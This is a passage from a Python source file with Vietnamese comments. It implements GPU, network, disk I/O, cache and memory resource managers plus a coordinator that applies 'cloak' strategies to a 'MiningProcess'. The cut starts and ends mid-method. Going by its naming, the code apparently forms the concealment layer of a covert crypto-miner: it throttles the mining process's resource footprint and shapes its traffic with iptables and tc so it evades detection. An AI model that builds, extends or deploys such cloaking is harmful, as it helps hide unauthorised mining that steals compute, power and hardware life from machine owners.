        self.logger.info(f"[GPU Fan] control_fan_speed đã bị vô hiệu hóa.")
        return True

    def get_default_power_limit(self, gpu_index: int) -> int:
        """
        Lấy Power Limit mặc định của GPU.

        :param gpu_index: Chỉ số GPU.
        :return: Giá trị Power Limit mặc định (W), hoặc None nếu không lấy được.
        """
        try:
            handle = self.get_handle(gpu_index)
            return pynvml.nvmlDeviceGetPowerManagementDefaultLimit(handle) // 1000  # Chuyển từ mW sang W
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy default power limit của GPU={gpu_index}: {e}")
            return None

    def restore_resources(self, pid: int) -> bool:
        """
        Khôi phục power limit mặc định (250W) và reset xung nhịp GPU về trạng thái mặc định cho PID tiến trình.

        :param pid: PID của tiến trình cần khôi phục.
        :return: True nếu khôi phục thành công, False nếu gặp lỗi.
        """
        try:
            # Lấy cấu hình GPU liên quan đến PID
            pid_settings = self.process_gpu_settings.get(pid)
            if not pid_settings:
                self.logger.warning(f"Không tìm thấy cấu hình GPU cho PID={pid}.")
                return False

            restored_all = True

            # Duyệt qua từng GPU liên quan đến PID
            for gpu_index in pid_settings.keys():
                success = True

                # Đặt lại power limit về mặc định (giả định là 250W)
                default_power_limit = 250
                if self.set_gpu_power_limit(pid, gpu_index, default_power_limit):
                    self.logger.info(f"Khôi phục power limit GPU={gpu_index} về {default_power_limit}W (PID={pid}).")
                else:
                    self.logger.error(f"Không thể khôi phục power limit GPU={gpu_index} (PID={pid}).")
                    success = False

                # Reset GPU clocks về mặc định bằng lệnh nvidia-smi
                try:
                    subprocess.run(
                        ["sudo", "nvidia-smi", "-i", str(gpu_index), "--reset-gpu-clocks"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    self.logger.info(f"Khôi phục clock GPU={gpu_index} về trạng thái mặc định (PID={pid}).")
                except subprocess.CalledProcessError as e:
                    self.logger.error(f"Không thể khôi phục clock GPU={gpu_index} (PID={pid}): {e.stderr.decode().strip()}")
                    success = False

                # Ghi nhận trạng thái khôi phục
                if not success:
                    restored_all = False

            # Xóa cấu hình liên quan đến PID sau khi khôi phục
            del self.process_gpu_settings[pid]
            self.logger.info(f"Đã khôi phục toàn bộ cấu hình GPU cho PID={pid}.")
            return restored_all
            
        except Exception as e:
            self.logger.error(f"Lỗi khi khôi phục GPU cho PID={pid}: {e}")
            return False

###############################################################################
#                           NETWORK RESOURCE MANAGER                           #
###############################################################################

class NetworkResourceManager:
    """
    Quản lý tài nguyên mạng qua iptables + tc (đồng bộ).

    Attributes:
        logger (logging.Logger): Logger để ghi log.
        config (Dict[str, Any]): Cấu hình Network Resource Manager.
        process_marks (Dict[int, int]): Bản đồ UID -> mark iptables.
    """

    def __init__(self, config: Dict[str, any], logger: logging.Logger):
        """
        Khởi tạo NetworkResourceManager.

        :param config: Cấu hình network (dict).
        :param logger: Logger.
        """
        self.logger = logger
        self.config = config
        self.process_marks: Dict[int, int] = {}

    # ======================
    #  ĐÁNH DẤU GÓI TIN (iptables)
    # ======================

    def mark_packets(self, uid: int, mark: int) -> bool:
        """
        Đánh dấu gói tin chỉ khi quy tắc chưa tồn tại, sử dụng UID.

        :param uid: UID của tiến trình cần đánh dấu gói tin.
        :param mark: Giá trị MARK iptables.
        :return: True nếu thành công, False nếu thất bại.
        """
        try:
            # Kiểm tra nếu đã tồn tại quy tắc
            if self._check_iptables_rule(uid, mark):
                self.logger.debug(f"MARK iptables đã tồn tại cho UID={uid}, mark={mark}.")
                return True

            # Thêm quy tắc iptables
            cmd_add = [
                'iptables', '-A', 'OUTPUT', '-m', 'owner',
                '--uid-owner', str(uid),
                '-j', 'MARK', '--set-mark', str(mark)
            ]
            subprocess.run(cmd_add, check=True)
            self.logger.info(f"Đánh dấu MARK iptables thành công: UID={uid}, mark={mark}.")
            self.process_marks[uid] = mark
            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi iptables MARK UID={uid}: {e}")
            return False

    def unmark_packets(self, uid: int, mark: int) -> bool:
        """
        Xóa quy tắc MARK iptables nếu tồn tại.

        :param uid: UID của tiến trình cần xóa quy tắc.
        :param mark: Giá trị MARK iptables.
        :return: True nếu thành công, False nếu thất bại.
        """
        try:
            if not self._check_iptables_rule(uid, mark):
                self.logger.debug(f"Quy tắc MARK không tồn tại cho UID={uid}, mark={mark}.")
                return True

            # Xóa quy tắc iptables
            cmd_del = [
                'iptables', '-D', 'OUTPUT', '-m', 'owner',
                '--uid-owner', str(uid),
                '-j', 'MARK', '--set-mark', str(mark)
            ]
            subprocess.run(cmd_del, check=True)
            self.logger.info(f"Đã xóa MARK iptables: UID={uid}, mark={mark}.")
            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi iptables unMARK UID={uid}: {e}")
            return False

    def _check_iptables_rule(self, uid: int, mark: int) -> bool:
        """
        Kiểm tra xem quy tắc MARK iptables đã tồn tại hay chưa.

        :param uid: UID cần kiểm tra.
        :param mark: Giá trị MARK cần kiểm tra.
        :return: True nếu tồn tại, False nếu không tồn tại.
        """
        cmd_check = [
            'iptables', '-C', 'OUTPUT', '-m', 'owner',
            '--uid-owner', str(uid),
            '-j', 'MARK', '--set-mark', str(mark)
        ]
        return subprocess.run(cmd_check, check=False).returncode == 0

    # ======================
    #  GIỚI HẠN BĂNG THÔNG (tc)
    # ======================

    def limit_bandwidth(self, interface: str, mark: int, bandwidth_mbps: float) -> bool:
        """
        Giới hạn băng thông cho các gói tin được đánh dấu.

        :param interface: Giao diện mạng (vd: eth0).
        :param mark: Giá trị MARK iptables.
        :param bandwidth_mbps: Băng thông tối đa (mbps).
        :return: True nếu thành công, False nếu thất bại.
        """
        try:
            if bandwidth_mbps <= 0:
                self.logger.error("Giới hạn băng thông không hợp lệ.")
                return False

            # Kiểm tra nếu `qdisc` đã tồn tại
            if not self._check_tc_qdisc(interface):
                cmd_qdisc = [
                    'tc', 'qdisc', 'add', 'dev', interface,
                    'root', 'handle', '1:', 'htb', 'default', '12'
                ]
                subprocess.run(cmd_qdisc, check=True)
                self.logger.info(f"Thêm qdisc 'htb' cho {interface}.")

            # Kiểm tra và thêm class
            if not self._check_tc_class(interface, '1:1'):
                cmd_class = [
                    'tc', 'class', 'add', 'dev', interface,
                    'parent', '1:', 'classid', '1:1',
                    'htb', 'rate', f'{bandwidth_mbps}mbit'
                ]
                subprocess.run(cmd_class, check=True)
                self.logger.info(f"Thêm class '1:1' rate={bandwidth_mbps}mbit cho {interface}.")

            # Kiểm tra và thêm filter
            if not self._check_tc_filter(interface, mark):
                cmd_filter = [
                    'tc', 'filter', 'add', 'dev', interface,
                    'protocol', 'ip', 'parent', '1:', 'prio', '1',
                    'handle', str(mark), 'fw', 'flowid', '1:1'
                ]
                subprocess.run(cmd_filter, check=True)
                self.logger.info(f"Thêm filter mark={mark} trên {interface}.")
            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi limit_bandwidth: {e}")
            self.remove_bandwidth_limit(interface, mark)
            return False

    def remove_bandwidth_limit(self, interface: str, mark: int) -> bool:
        """
        Gỡ bỏ giới hạn băng thông trên giao diện.

        :param interface: Giao diện mạng (vd: eth0).
        :param mark: Giá trị MARK iptables.
        :return: True nếu thành công, False nếu thất bại.
        """
        try:
            # Xóa filter
            if self._check_tc_filter(interface, mark):
                cmd_filter = [
                    'tc', 'filter', 'del', 'dev', interface,
                    'protocol', 'ip', 'parent', '1:', 'prio', '1',
                    'handle', str(mark), 'fw', 'flowid', '1:1'
                ]
                subprocess.run(cmd_filter, check=True)
                self.logger.info(f"Xóa filter mark={mark} trên {interface}.")

            # Xóa class
            if self._check_tc_class(interface, '1:1'):
                cmd_class = [
                    'tc', 'class', 'del', 'dev', interface,
                    'parent', '1:', 'classid', '1:1'
                ]
                subprocess.run(cmd_class, check=True)
                self.logger.info(f"Xóa class '1:1' trên {interface}.")

            # Xóa qdisc
            if self._check_tc_qdisc(interface):
                cmd_qdisc = [
                    'tc', 'qdisc', 'del', 'dev', interface,
                    'root', 'handle', '1:', 'htb'
                ]
                subprocess.run(cmd_qdisc, check=True)
                self.logger.info(f"Xóa qdisc 'htb' trên {interface}.")
            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi remove_bandwidth_limit: {e}")
            return False

    def _check_tc_qdisc(self, interface: str) -> bool:
        cmd_check = ['tc', 'qdisc', 'show', 'dev', interface]
        output = subprocess.check_output(cmd_check, text=True)
        return 'htb' in output

    def _check_tc_class(self, interface: str, classid: str) -> bool:
        cmd_check = ['tc', 'class', 'show', 'dev', interface]
        output = subprocess.check_output(cmd_check, text=True)
        return classid in output

    def _check_tc_filter(self, interface: str, mark: int) -> bool:
        cmd_check = ['tc', 'filter', 'show', 'dev', interface]
        output = subprocess.check_output(cmd_check, text=True)
        return str(mark) in output

    def restore_resources(self, uid: Optional[int] = None) -> bool:
        """
        Khôi phục các tài nguyên mạng liên quan đến UID hoặc tất cả UIDs.
        """
        success = True
        uids_to_restore = [uid] if uid else list(self.process_marks.keys())
        for uid in uids_to_restore:
            mark = self.process_marks.get(uid)
            if mark:
                self.remove_bandwidth_limit(self.config.get("network_interface", "eth0"), mark)
                self.unmark_packets(uid, mark)
                self.process_marks.pop(uid, None)
        return success

###############################################################################
#                      DISK I/O RESOURCE MANAGER                              #
###############################################################################

class DiskIOResourceManager:
    """
    Quản lý Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O.

    Attributes:
        logger (logging.Logger): Logger để ghi log.
        config (Dict[str, Any]): Cấu hình Disk I/O Resource Manager.
        process_io_limits (Dict[int, float]): Lưu PID -> giá trị io_weight hoặc giới hạn I/O.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo DiskIOResourceManager.

        :param config: Cấu hình Disk I/O (dict).
        :param logger: Logger.
        """
        self.logger = logger
        self.config = config
        self.process_io_limits: Dict[int, float] = {}

    def set_io_weight(self, pid: int, io_weight: int) -> bool:
        """
        Đặt trọng số I/O cho PID (ionice) - đồng bộ.

        :param pid: PID cần giới hạn.
        :param io_weight: Mức io_weight (0-7 cho Best Effort class).
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            # Kiểm tra giá trị io_weight hợp lệ
            if not (0 <= io_weight <= 7):
                self.logger.error(f"Giá trị io_weight không hợp lệ: {io_weight}. Hợp lệ: 0-7.")
                return False

            # Kiểm tra tiến trình tồn tại
            if not psutil.pid_exists(pid):
                self.logger.error(f"PID={pid} không tồn tại.")
                return False

            # Lấy thông tin tiến trình để log thêm
            process = psutil.Process(pid)
            process_name = process.name()

            # Xây dựng lệnh
            cmd = ['ionice', '-c', '2', '-n', str(io_weight), '-p', str(pid)]

            # Thực thi lệnh
            subprocess.run(cmd, check=True)
            self.logger.info(f"Set io_weight={io_weight} cho PID={pid} ({process_name}) thành công.")
            self.process_io_limits[pid] = io_weight
            return True

        except psutil.NoSuchProcess:
            self.logger.error(f"Lỗi: PID={pid} không tồn tại.")
            return False
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi ionice set_io_weight PID={pid}: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong set_io_weight PID={pid}: {e}\n{traceback.format_exc()}")
            return False

    def restore_resources(self, pid: int) -> bool:
        """
        Khôi phục Disk I/O => set ionice class=0 (best effort) - đồng bộ.

        :param pid: PID cần khôi phục Disk I/O.
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            # Kiểm tra tiến trình tồn tại
            if not psutil.pid_exists(pid):
                self.logger.error(f"PID={pid} không tồn tại.")
                return False

            # Lấy thông tin tiến trình để log thêm
            process = psutil.Process(pid)
            process_name = process.name()

            # Xây dựng lệnh khôi phục
            cmd = ['ionice', '-c', '0', '-p', str(pid)]

            # Thực thi lệnh
            subprocess.run(cmd, check=True)
            self.logger.info(f"Khôi phục Disk I/O cho PID={pid} ({process_name}) thành công.")
            if pid in self.process_io_limits:
                del self.process_io_limits[pid]
            return True

        except psutil.NoSuchProcess:
            self.logger.error(f"Lỗi: PID={pid} không tồn tại.")
            return False
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi ionice restore_resources PID={pid}: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong restore_resources PID={pid}: {e}\n{traceback.format_exc()}")
            return False

    def list_io_limits(self) -> Dict[int, float]:
        """
        Liệt kê tất cả các tiến trình và giới hạn I/O hiện tại.

        :return: Bản đồ PID -> io_weight.
        """
        return self.process_io_limits


###############################################################################
#                       CACHE RESOURCE MANAGER                                #
###############################################################################
class CacheResourceManager:
    """
    Quản lý Cache (đồng bộ).

    Attributes:
        logger (logging.Logger): Logger để ghi log.
        config (Dict[str, Any]): Cấu hình Cache Resource Manager.
        dropped_pids (List[int]): Lưu danh sách PID từng được drop cache.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo CacheResourceManager.

        :param config: Cấu hình Cache (dict).
        :param logger: Logger.
        """
        self.logger = logger
        self.config = config
        self.dropped_pids: List[int] = []

    def drop_caches(self, pid: Optional[int] = None) -> bool:
        """
        Drop caches (đồng bộ).

        :param pid: PID liên quan (nếu muốn lưu thêm vào dropped_pids).
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            cmd = ['sh', '-c', 'echo 3 > /proc/sys/vm/drop_caches']
            subprocess.run(cmd, check=True)
            self.logger.debug("Đã drop caches.")
            if pid:
                self.dropped_pids.append(pid)
            return True
        except subprocess.CalledProcessError:
            self.logger.error("Không đủ quyền drop_caches hoặc lệnh thất bại.")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi drop_caches: {e}")
            return False

    def limit_cache_usage(self, cache_limit_percent: float, pid: Optional[int] = None) -> bool:
        """
        Giới hạn cache => Tối giản: drop caches + log (đồng bộ).
        Chưa có cơ chế kernel-level limit caches.

        :param cache_limit_percent: Tỷ lệ cache limit (0-100).
        :param pid: PID nếu muốn lưu info, mặc định=None.
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            success = self.drop_caches(pid)
            if not success:
                return False
            self.logger.debug(f"Giới hạn cache => {cache_limit_percent}%. (chưa có logic chi tiết)")
            return True
        except Exception as e:
            self.logger.error(f"Lỗi limit_cache_usage: {e}")
            return False

    def restore_resources(self, pid: int) -> bool:
        """
        Khôi phục cache => limit_cache_usage(100) (đồng bộ).

        :param pid: PID cần khôi phục cache.
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            success = self.limit_cache_usage(100.0, pid)
            if success:
                self.logger.info(f"Khôi phục Cache cho PID={pid} => 100%.")
            else:
                self.logger.error(f"Không thể khôi phục Cache cho PID={pid}.")
            return success
        except Exception as e:
            self.logger.error(f"Lỗi restore_resources Cache cho PID={pid}: {e}")
            return False


###############################################################################
#                       MEMORY RESOURCE MANAGER                               #
###############################################################################
class MemoryResourceManager:
    """
    Quản lý Memory qua psutil rlimit (đồng bộ).

    Attributes:
        logger (logging.Logger): Logger để ghi log.
        config (Dict[str, Any]): Cấu hình Memory Resource Manager.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo MemoryResourceManager.

        :param config: Cấu hình Memory (dict).
        :param logger: Logger.
        """
        self.logger = logger
        self.config = config

    def set_memory_limit(self, pid: int, memory_limit_mb: int) -> bool:
        """
        Đặt memory limit (MB) cho tiến trình (đồng bộ).

        :param pid: PID cần giới hạn bộ nhớ.
        :param memory_limit_mb: Giới hạn bộ nhớ (MB).
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            process = psutil.Process(pid)
            mem_bytes = memory_limit_mb * 1024 * 1024
            process.rlimit(psutil.RLIMIT_AS, (mem_bytes, mem_bytes))
            self.logger.debug(f"Đặt memory_limit={memory_limit_mb}MB cho PID={pid}.")
            return True
        except psutil.NoSuchProcess:
            self.logger.error(f"PID={pid} không tồn tại (set_memory_limit).")
            return False
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền set_memory_limit cho PID={pid}.")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi set_memory_limit cho PID={pid}: {e}")
            return False

    def get_memory_limit(self, pid: int) -> float:
        """
        Lấy memory limit (bytes) cho tiến trình (đồng bộ).

        :param pid: PID cần kiểm tra limit.
        :return: Giá trị memory limit (bytes), hoặc 0.0 nếu lỗi.
        """
        try:
            process = psutil.Process(pid)
            mem_limit = process.rlimit(psutil.RLIMIT_AS)
            if mem_limit and mem_limit[1] != psutil.RLIM_INFINITY:
                self.logger.debug(f"Memory limit PID={pid}={mem_limit[1]} bytes.")
                return float(mem_limit[1])
            else:
                self.logger.debug(f"PID={pid} không giới hạn bộ nhớ.")
                return float('inf')
        except Exception as e:
            self.logger.error(f"Lỗi get_memory_limit PID={pid}: {e}")
            return 0.0

    def remove_memory_limit(self, pid: int) -> bool:
        """
        Khôi phục memory => không giới hạn (đồng bộ).

        :param pid: PID cần bỏ giới hạn.
        :return: True nếu thành công, False nếu lỗi.
        """
        try:
            process = psutil.Process(pid)
            process.rlimit(psutil.RLIMIT_AS, (psutil.RLIM_INFINITY, psutil.RLIM_INFINITY))
            self.logger.debug(f"Khôi phục memory cho PID={pid} => không giới hạn.")
            return True
        except psutil.NoSuchProcess:
            self.logger.error(f"PID={pid} không tồn tại khi remove_memory_limit.")
            return False
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền remove_memory_limit cho PID={pid}.")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi remove_memory_limit cho PID={pid}: {e}")
            return False

    def restore_resources(self, pid: int) -> bool:
        """
        Khôi phục memory => remove_memory_limit (đồng bộ).

        :param pid: PID cần khôi phục memory.
        :return: True nếu thành công, False nếu lỗi.
        """
        return self.remove_memory_limit(pid)


###############################################################################
#                     RESOURCE CONTROL FACTORY                                #
###############################################################################
class ResourceControlFactory:
    """
    ✅ ENHANCED: Singleton factory tạo các resource manager với instance sharing.
    Prevents redundant resource manager creation và optimizes memory usage.
    """
    
    # ✅ SINGLETON: Shared resource manager instances
    _shared_managers: Dict[str, Dict[str, Any]] = {}  # config_hash -> resource_managers
    _managers_lock = threading.RLock()  # Thread-safe access

    @staticmethod
    def create_resource_managers(config: Dict[str, Any], logger: logging.Logger) -> Dict[str, Any]:
        """
        ✅ ENHANCED: Singleton-aware resource managers creation với instance sharing.
        Reuses existing instances nếu có cùng config để prevent redundant creation.

        :param config: Cấu hình ResourceManager (dict).
        :param logger: Logger dùng để ghi log.
        :return: Dictionary chứa các shared resource managers.
        """
        # ✅ SINGLETON LOGIC: Generate config hash for instance sharing
        import hashlib
        import json
        
        try:
            config_str = json.dumps(config, sort_keys=True)
            config_hash = hashlib.md5(config_str.encode()).hexdigest()[:8]
        except Exception:
            # Fallback to basic hash if JSON serialization fails
            config_hash = str(hash(str(config)))[:8]
            
        with ResourceControlFactory._managers_lock:
            # ✅ REUSE: Return existing managers if available
            if config_hash in ResourceControlFactory._shared_managers:
                existing_managers = ResourceControlFactory._shared_managers[config_hash]
                logger.info(f"♾️ [Factory] Reusing existing resource managers (hash: {config_hash})")
                logger.info(f"🔄 [Factory] Available managers: {list(existing_managers.keys())}")
                return existing_managers
            
            # ✅ CREATE: New managers if none exist for this config
            logger.info(f"⚙️ [Factory] Creating new resource managers (hash: {config_hash})")
        resource_managers = {}
        manager_classes = {
            'cpu': CPUResourceManager,
            'gpu': GPUResourceManager,
            'network': NetworkResourceManager,
            'disk_io': DiskIOResourceManager,
            'cache': CacheResourceManager,
            'memory': MemoryResourceManager,
        }

        for name, manager_class in manager_classes.items():
            try:
                logger.info(f"Đang khởi tạo {name} manager...")
                manager_instance = manager_class(config, logger)
                resource_managers[name] = manager_instance
                logger.info(f"{name.capitalize()} manager đã được khởi tạo thành công.")
            except Exception as e:
                logger.error(f"Lỗi khi khởi tạo {name} manager: {e}", exc_info=True)

            # (tiếp tục vòng lặp để khởi tạo các manager khác)

        # --- Kết thúc vòng for ---
        if not resource_managers:
            logger.error("Không có resource managers nào được khởi tạo.")
            raise RuntimeError("Tất cả resource managers đều khởi tạo thất bại.")

        # ✅ CACHE: Store managers for reuse (sau khi đã khởi tạo đầy đủ)
        ResourceControlFactory._shared_managers[config_hash] = resource_managers
        logger.info(f"✅ [Factory] Tất cả resource managers đã được khởi tạo và cached (hash: {config_hash}).")
        logger.info(f"📊 [Factory] Total shared instances: {len(ResourceControlFactory._shared_managers)}")
        return resource_managers

    @staticmethod
    def get_shared_managers_info() -> Dict[str, Any]:
        """
        ✅ NEW: Get information about shared resource manager instances.
        
        :return: Dictionary containing shared managers statistics
        """
        with ResourceControlFactory._managers_lock:
            return {
                'total_configs': len(ResourceControlFactory._shared_managers),
                'config_hashes': list(ResourceControlFactory._shared_managers.keys()),
                'managers_per_config': {
                    config_hash: list(managers.keys()) 
                    for config_hash, managers in ResourceControlFactory._shared_managers.items()
                },
                'memory_efficiency': f"{len(ResourceControlFactory._shared_managers)} shared instances vs potential duplicates"
            }
    
    @staticmethod
    def validate_manager_instances(expected_managers: List[str]) -> bool:
        """
        ✅ NEW: Validate that required manager instances are available and functional.
        
        :param expected_managers: List of manager names that should be available
        :return: True if all expected managers are available and functional
        """
        try:
            with ResourceControlFactory._managers_lock:
                for config_hash, managers in ResourceControlFactory._shared_managers.items():
                    missing_managers = set(expected_managers) - set(managers.keys())
                    if missing_managers:
                        resource_logger.warning(f"⚠️ [Validation] Config {config_hash} missing managers: {missing_managers}")
                        return False
                    
                    # ✅ FUNCTIONAL CHECK: Verify each manager is still operational
                    for manager_name, manager_instance in managers.items():
                        if manager_instance is None:
                            resource_logger.error(f"❌ [Validation] Manager '{manager_name}' is None in config {config_hash}")
                            return False
                        
                        # Basic health check - verify the manager has expected attributes
                        if not hasattr(manager_instance, 'config') or not hasattr(manager_instance, 'logger'):
                            resource_logger.error(f"❌ [Validation] Manager '{manager_name}' missing required attributes")
                            return False
                
                resource_logger.info(f"✅ [Validation] All {len(expected_managers)} expected managers validated successfully")
                return True
                
        except Exception as e:
            resource_logger.error(f"❌ [Validation] Error validating manager instances: {e}")
            return False
    
    @staticmethod
    def cleanup_unused_managers() -> int:
        """
        ✅ NEW: Clean up unused resource manager instances to free memory.
        
        :return: Number of cleaned up manager configurations
        """
        try:
            with ResourceControlFactory._managers_lock:
                initial_count = len(ResourceControlFactory._shared_managers)
                
                # For now, we'll keep all managers as they might be reused
                # In a more sophisticated implementation, we could track usage and clean up unused ones
                resource_logger.info(f"🧹 [Cleanup] Keeping {initial_count} manager configurations (all potentially active)")
                
                return 0  # No cleanup performed in this conservative implementation
                
        except Exception as e:
            resource_logger.error(f"❌ [Cleanup] Error during cleanup: {e}")
            return 0

    # ------------------------------------------------------------------
    # Fail-safe helper
    # ------------------------------------------------------------------
    def _apply_rlimits(self, pid: int, cpu_sec: int = 2) -> None:
        """
        Áp dụng giới hạn tài nguyên (resource limits) lên một tiến trình.
        Đây là một phương pháp fallback khi không thể sử dụng cgroups.
        
        Args:
            pid: Process ID để áp dụng giới hạn
            cpu_sec: Số giây CPU tối đa cho phép sử dụng
        """
        try:
            # Kiểm tra xem tiến trình có tồn tại không
            if not psutil.pid_exists(pid):
                self.logger.warning(f"PID {pid} không tồn tại, không thể áp dụng RLIMIT")
                return
                
            # Sử dụng RLIMIT_CPU để giới hạn thời gian CPU
            # resource.RLIMIT_CPU: Giới hạn thời gian CPU tính bằng giây
            resource.prlimit(pid, resource.RLIMIT_CPU, (cpu_sec, cpu_sec * 2))
            
            # Cũng có thể giới hạn bộ nhớ nếu cần
            # resource.prlimit(pid, resource.RLIMIT_AS, (memory_bytes, memory_bytes))
            
            self.logger.debug(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho PID={pid}")
        except (ProcessLookupError, PermissionError) as e:
            self.logger.warning(f"Không thể áp dụng rlimits cho PID={pid}: {e}")
        except Exception as e:
            self.logger.debug(f"Lỗi khi áp dụng rlimits: {e}")
            # Lỗi không quan trọng, phương thức này chỉ là biện pháp dự phòng

###############################################################################
#                           RESOURCE COORDINATOR                              #
###############################################################################

class ResourceCoordinator:
    """
    ✅ ENHANCED: Điều phối viên trung tâm với shared resource managers.
    Phân biệt giữa direct execution và plugin delegation.
    Optimized với singleton resource managers để prevent redundant creation.
    
    Strategies: CPU, GPU (with thermal), Network, Disk I/O, Cache, Memory
    """
    
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo ResourceCoordinator.
        
        :param config: Cấu hình hệ thống
        :param logger: Logger để ghi log
        """
        self.config = config
        self.logger = logger
        self.resource_managers = {}
        
        # Import strategies
        from .cloak_strategies import (
            CpuCloakStrategy, GpuCloakStrategy, NetworkCloakStrategy,
            DiskIoCloakStrategy, CacheCloakStrategy, MemoryCloakStrategy,
            StrategyType
        )
        
        # ✅ ENHANCED: Use shared resource managers from singleton factory
        try:
            self.resource_managers = ResourceControlFactory.create_resource_managers(config, logger)
            
            # ✅ VALIDATION: Verify all required managers are available
            required_managers = ['cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory']
            if ResourceControlFactory.validate_manager_instances(required_managers):
                self.logger.info("✅ ResourceCoordinator using shared resource managers successfully")
                
                # ✅ METRICS: Log sharing efficiency
                sharing_info = ResourceControlFactory.get_shared_managers_info()
                self.logger.info(f"📊 [ResourceCoordinator] {sharing_info['memory_efficiency']}")
            else:
                self.logger.warning("⚠️ ResourceCoordinator validation issues detected")
                
        except Exception as e:
            self.logger.error(f"❌ Lỗi khởi tạo shared resource managers: {e}")
            raise
        
        # Khởi tạo strategies
        self.strategies = {
            StrategyType.CPU: CpuCloakStrategy(config, logger, self.resource_managers.get('cpu')),
            StrategyType.GPU: GpuCloakStrategy(config, logger, self.resource_managers.get('gpu')),
            StrategyType.NETWORK: NetworkCloakStrategy(config, logger, self.resource_managers.get('network')),
            StrategyType.DISK_IO: DiskIoCloakStrategy(config, logger, self.resource_managers.get('disk_io')),
            StrategyType.CACHE: CacheCloakStrategy(config, logger, self.resource_managers.get('cache')),
            StrategyType.MEMORY: MemoryCloakStrategy(config, logger, self.resource_managers.get('memory'), self.resource_managers.get('cache'))
        }
        
        self.logger.info("✅ ResourceCoordinator khởi tạo 6 unified strategies thành công (thermal integrated trong GPU)")
    
    def apply_strategy(self, strategy_type: str, process: Any) -> bool:
        """
        Áp dụng một chiến lược cụ thể cho một tiến trình.
        
        :param strategy_type: Loại chiến lược cần áp dụng
        :param process: Đối tượng MiningProcess cần áp dụng chiến lược
        :return: True nếu áp dụng thành công, False nếu thất bại
        """
        try:
            strategy = self.strategies.get(strategy_type)
            if not strategy:
                self.logger.error(f"❌ Không tìm thấy strategy: {strategy_type}")
                return False
            
            # Phân biệt giữa direct execution và plugin delegation
            if strategy.requires_plugin_system:
                return self._delegate_to_plugin(strategy_type, strategy, process)
            else:
                return self._direct_execute(strategy_type, strategy, process)
                
        except Exception as e:
            self.logger.error(f"❌ Lỗi áp dụng strategy {strategy_type}: {e}")
            return False
    
    def apply_strategies(self, process: Any) -> Dict[str, bool]:
        """
        Áp dụng tất cả chiến lược phù hợp cho một tiến trình.
        
        :param process: Đối tượng MiningProcess cần áp dụng chiến lược
        :return: Dictionary chứa kết quả áp dụng từng chiến lược
        """
        results = {}
        
        # Xác định loại tiến trình
        is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
        
        # Áp dụng chiến lược phù hợp
        if is_gpu:
            # GPU process: áp dụng GPU (with integrated thermal) + các chiến lược chung
            # ✅ UNIFIED: Thermal management được integrate trong StrategyType.GPU
            strategies_to_apply = [
                StrategyType.GPU,  # Includes integrated thermal management
                StrategyType.NETWORK,
                StrategyType.DISK_IO,
                StrategyType.CACHE,
                StrategyType.MEMORY
            ]
        else:
            # CPU process: áp dụng CPU + các chiến lược chung
            strategies_to_apply = [
                StrategyType.CPU,
                StrategyType.NETWORK,
                StrategyType.DISK_IO,
                StrategyType.CACHE,
                StrategyType.MEMORY
            ]
        
        for strategy_type in strategies_to_apply:
            results[strategy_type] = self.apply_strategy(strategy_type, process)
        
        return results
    
    def _direct_execute(self, strategy_type: str, strategy: Any, process: Any) -> bool:
        """
        Thực thi trực tiếp một chiến lược.
        
        :param strategy_type: Loại chiến lược
        :param strategy: Đối tượng chiến lược
        :param process: Đối tượng MiningProcess
        :return: True nếu thực thi thành công, False nếu thất bại
        """
        try:
            self.logger.info(f"🔧 Direct execute strategy: {strategy_type} cho PID={process.pid}")
            strategy.apply(process)
            self.logger.info(f"✅ Direct execute thành công: {strategy_type} cho PID={process.pid}")
            return True
        except Exception as e:
            self.logger.error(f"❌ Lỗi direct execute {strategy_type}: {e}")
            return False
    
    def _delegate_to_plugin(self, strategy_type: str, strategy: Any, process: Any) -> bool:
        """
        Ủy quyền thực thi cho plugin system.
        
        :param strategy_type: Loại chiến lược
        :param strategy: Đối tượng chiến lược
        :param process: Đối tượng MiningProcess
        :return: True nếu ủy quyền thành công, False nếu thất bại
        """
        try:
            self.logger.debug(f"🔄 Ủy quyền chiến lược {strategy_type} cho plugin system")
            
            # CPU plugin delegation
            if strategy_type == StrategyType.CPU:
                cpu_manager = self.resource_managers.get('cpu')
                if not cpu_manager:
                    self.logger.error("❌ Không tìm thấy CPU resource manager")
                    return False
                    
                # Đăng ký PID với plugin system
                cpu_manager.register_pid(process.pid)
                
                # Apply các plugin optimization và cloaking theo blueprint
                try:
                    plugins_applied = 0
                    
                    # Kiểm tra xem cpu_manager có plugins attribute
                    if hasattr(cpu_manager, 'plugins') and cpu_manager.plugins:
                        for plugin in cpu_manager.plugins:
                            if hasattr(plugin, 'apply') and callable(getattr(plugin, 'apply')):
                                try:
                                    plugin.apply(process.pid)
                                    plugins_applied += 1
